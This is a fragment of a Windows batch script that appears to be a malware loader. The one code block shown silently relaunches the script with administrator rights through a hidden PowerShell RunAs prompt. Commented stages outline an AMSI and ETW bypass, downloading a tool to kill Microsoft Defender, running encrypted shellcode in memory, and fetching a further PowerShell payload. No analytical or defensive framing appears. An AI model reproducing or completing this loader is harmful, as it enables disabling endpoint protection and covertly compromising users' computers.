...
rem === STEP 0: Self-elevation via RunAs (get admin FIRST) ===
whoami /groups | find "S-1-16-12288" >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoP -W Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\"' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

rem === STEP 1: AMSI + ETW bypass (inline, one process) ===
...
rem === STEP 2: Download + run Defender Killer as PROCESS with 'kill' arg ===
...
rem === STEP 3: ElevatorShellcode (AES in-memory, no args needed) ===
...
rem === STEP 4: Download + run stage_v6_pulsaar.ps1 ===
